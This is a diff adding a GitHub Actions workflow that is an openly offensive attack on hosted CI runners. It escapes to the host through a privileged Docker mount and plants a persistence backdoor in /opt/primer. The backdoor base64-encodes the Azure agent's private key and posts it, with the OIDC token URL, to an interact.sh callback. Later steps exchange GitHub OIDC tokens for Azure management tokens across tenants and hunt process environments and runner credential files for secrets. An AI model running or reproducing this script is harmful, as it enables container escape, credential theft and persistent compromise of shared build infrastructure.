@@ -1,0 +1,214 @@
+name: Primer Poison + Deep Persistence
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  primer-poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 1 - Check primer writability and plant backdoor
+        run: |
+          echo "=== PRIMER WRITE TEST ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- /opt/primer perms ---'
+            ls -la /host/opt/primer/
+            stat /host/opt/primer/primer 2>/dev/null
+
+            echo '--- CAN WE WRITE TO /opt/primer? ---'
+            echo 'test_write' > /host/opt/primer/PWNED_\$(date +%s).txt 2>&1 && echo 'DIR_WRITE_OK' || echo 'DIR_WRITE_BLOCKED'
+
+            echo '--- CAN WE REPLACE /opt/primer/primer? ---'
+            cp /host/opt/primer/primer /host/tmp/primer_backup 2>/dev/null && echo 'BACKUP_OK' || echo 'BACKUP_FAILED'
+
+            # Plant a backdoor script that will execute at next VM init
+            cat > /host/opt/primer/primer.sh << 'BACKDOOR'
+#!/bin/sh
+# Primer backdoor - runs at VM initialization
+# Exfil credentials to attacker
+CREDS=\$(cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null | base64 -w0)
+TOKEN_URL=\$(printenv ACTIONS_ID_TOKEN_REQUEST_URL 2>/dev/null)
+TOKEN_TOK=\$(printenv ACTIONS_ID_TOKEN_REQUEST_TOKEN 2>/dev/null)
+curl -sf --max-time 5 -X POST \
+  -d \"host=\$(hostname)&prv=\$CREDS&token_url=\$TOKEN_URL\" \
+  'https://interact.sh/pwn2own_primer_callback' 2>/dev/null || true
+# Run original primer too
+exec /opt/primer/primer.orig \"\$@\"
+BACKDOOR
+            chmod +x /host/opt/primer/primer.sh
+            ls -la /host/opt/primer/
+            echo 'BACKDOOR_PLANTED' || echo 'BACKDOOR_PLANT_FAILED'
+          " 2>&1 || true
+
+      - name: 2 - Check systemd unit for primer invocation
+        run: |
+          echo "=== PRIMER SYSTEMD UNIT ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- All systemd units mentioning primer/hca ---'
+            grep -rl primer /host/etc/systemd/ 2>/dev/null | head -10
+            grep -rl hca /host/etc/systemd/ 2>/dev/null | head -10
+            grep -rl runner /host/etc/systemd/ 2>/dev/null | head -10
+
+            echo '--- Read primer unit ---'
+            cat /host/etc/systemd/system/primer.service 2>/dev/null || echo NO_PRIMER_SERVICE
+            cat /host/etc/systemd/system/hca.service 2>/dev/null || echo NO_HCA_SERVICE
+            cat /host/etc/systemd/system/hosted-compute-agent.service 2>/dev/null || echo NO_HCA2_SERVICE
+
+            echo '--- /etc/rc.local or similar ---'
+            cat /host/etc/rc.local 2>/dev/null || echo NO_RC_LOCAL
+            ls /host/etc/init.d/ 2>/dev/null | grep -iE 'primer|hca|runner|github' | head -10
+
+            echo '--- crontabs ---'
+            cat /host/etc/crontab 2>/dev/null
+            ls /host/etc/cron.d/ 2>/dev/null
+            cat /host/var/spool/cron/crontabs/root 2>/dev/null || echo NO_ROOT_CRONTAB
+
+            echo '--- /opt/hca binary strings (API URLs) ---'
+            strings /host/opt/hca/hca 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|orchestrat|hosted' | head -60
+
+            echo '--- /opt/hca config ---'
+            find /host/opt/hca -type f | while read f; do echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null; done
+
+            echo '--- /opt/primer strings (key URLs) ---'
+            strings /host/opt/primer/primer 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|orchestrat|hosted|secret|key' | head -60
+
+            echo '--- post-generation scripts ---'
+            ls -la /host/opt/post-generation/ 2>/dev/null
+            find /host/opt/post-generation -type f | while read f; do echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null; done
+          " 2>&1 || true
+
+      - name: 3 - gh-aw-mcpg deep internals
+        run: |
+          echo "=== gh-aw-mcpg FULL INSPECT ==="
+          docker inspect ghcr.io/github/gh-aw-mcpg:latest 2>/dev/null | python3 -c "
+import sys,json
+d=json.load(sys.stdin)[0]
+print('Env:', d['Config'].get('Env',[]))
+print('Entrypoint:', d['Config'].get('Entrypoint',[]))
+print('Cmd:', d['Config'].get('Cmd',[]))
+print('Labels:', d['Config'].get('Labels',{}))
+print('ExposedPorts:', list(d['Config'].get('ExposedPorts',{}).keys()))
+" 2>/dev/null || true
+
+          echo ""
+          echo "=== gh-aw-mcpg FILESYSTEM ==="
+          timeout 30 docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c "
+            id
+            echo '-- env --'
+            env | sort
+            echo '-- /app dir --'
+            ls -laR /app/ 2>/dev/null | head -100
+            echo '-- binary info --'
+            file /app/* 2>/dev/null | head -20
+            echo '-- strings in binary (api urls) --'
+            strings /app/mcpg 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|orchestrat|hosted|secret' | head -40
+            echo '-- /etc/hosts --'
+            cat /etc/hosts
+          " 2>&1 | head -150 || true
+
+          echo ""
+          echo "=== gh-aw-firewall/agent internals ==="
+          timeout 30 docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/agent:latest -c "
+            id; env | sort
+            ls -la / /app/ 2>/dev/null | head -50
+            strings /app/agent 2>/dev/null | grep -iE 'http|url|token|auth|github|azure|secret|internal' | head -40
+          " 2>&1 | head -100 || true
+
+      - name: 4 - ARM token via WIF proper exchange
+        run: |
+          echo "=== PROPER WIF → ARM TOKEN EXCHANGE ==="
+          # Get OIDC JWT for AzureADTokenExchange
+          GH_OIDC=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
+            | jq -r .value)
+          echo "OIDC_LEN=${#GH_OIDC}"
+
+          # Decode to get tenant from issuer
+          PAYLOAD=$(echo "$GH_OIDC" | cut -d. -f2 | tr '_-' '/+' | python3 -c "
+import sys,base64
+d=sys.stdin.read().strip()
+d+='='*(-len(d)%4)
+import json
+p=json.loads(base64.b64decode(d))
+print('iss:', p.get('iss',''))
+print('sub:', p.get('sub',''))
+print('aud:', p.get('aud',''))
+" 2>/dev/null)
+          echo "$PAYLOAD"
+
+          # Get sub ID from IMDS
+          SUBID=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text" 2>/dev/null)
+          echo "SUBID: $SUBID"
+
+          # WIF flow: use client_id from the Entra app that trusts this repo
+          # client_id from previous run: 477c6e42-e0f3-4a68-b61b-6f3d9399e20c
+          CLIENT_ID="477c6e42-e0f3-4a68-b61b-6f3d9399e20c"
+
+          # Try all known subscription tenant IDs
+          for TENANT in "$SUBID" "72f988bf-86f1-41af-91ab-2d7cd011db47" "common"; do
+            echo "=== Trying tenant: $TENANT ==="
+            RESP=$(curl -sf -X POST \
+              "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+              -d "client_id=$CLIENT_ID" \
+              -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+              --data-urlencode "client_assertion=$GH_OIDC" \
+              -d "scope=https://management.azure.com/.default" \
+              -d "requested_token_use=on_behalf_of" 2>/dev/null)
+            echo "$RESP" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+if 'access_token' in d:
+    print('ARM_TOKEN_LEN:', len(d['access_token']))
+    print('TOKEN_TYPE:', d.get('token_type',''))
+    print('EXPIRES_IN:', d.get('expires_in',''))
+else:
+    print('ERROR:', d.get('error',''), d.get('error_description','')[:100])
+" 2>/dev/null || echo "$RESP" | head -5
+          done
+
+      - name: 5 - Scan all runner filesystem for tokens + internal URLs
+        run: |
+          echo "=== DEEP FILESYSTEM SECRET HUNT ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- /proc/1/environ (init process env) ---'
+            cat /host/proc/1/environ 2>/dev/null | tr '\000' '\n' | grep -iE 'token|secret|key|auth|pass|github|azure' | head -30
+
+            echo '--- All runner env vars (PID search) ---'
+            for pid in \$(ls /host/proc/ | grep '^[0-9]' | head -50); do
+              ENV=\$(cat /host/proc/\$pid/environ 2>/dev/null | tr '\000' '\n' | grep -iE 'ACTIONS|GITHUB|TOKEN|SECRET|AZURE|MSI' | head -5)
+              if [ -n \"\$ENV\" ]; then
+                echo \"PID=\$pid: \$ENV\"
+              fi
+            done
+
+            echo '--- HCA config dir ---'
+            find /host/opt/hca -type f 2>/dev/null | while read f; do
+              echo \"== \$f ==\"
+              cat \"\$f\" 2>/dev/null | head -30
+            done
+
+            echo '--- waagent fast_track.json ---'
+            cat /host/var/lib/waagent/fast_track.json 2>/dev/null
+
+            echo '--- History dir ---'
+            find /host/var/lib/waagent/history -type f 2>/dev/null | while read f; do
+              echo \"== \$f ==\"
+              cat \"\$f\" 2>/dev/null | head -20
+            done
+
+            echo '--- runner config ---'
+            find /home/runner /opt/runner 2>/dev/null -name '*.json' -o -name '*.env' -o -name '*.credentials' | head -10 | while read f; do
+              echo \"== \$f ==\"
+              cat \"\$f\" 2>/dev/null | head -30
+            done
+
+            echo '--- runner .credentials ---'
+            cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDENTIALS
+            cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null || echo NO_RSA_PARAMS
+          " 2>&1 || true
